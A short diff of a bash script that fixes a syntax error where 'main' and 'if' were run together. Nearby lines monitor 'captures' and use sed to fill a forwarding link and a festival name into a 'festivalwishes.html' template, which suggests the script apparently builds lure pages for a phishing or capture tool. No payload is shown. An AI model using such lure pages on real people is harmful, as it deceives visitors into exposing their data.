@@ -139,7 +139,8 @@ main() {
     monitor_captures
 }
 
-mainif [[ $option_tem -eq 1 ]]; then
+main
+if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 else
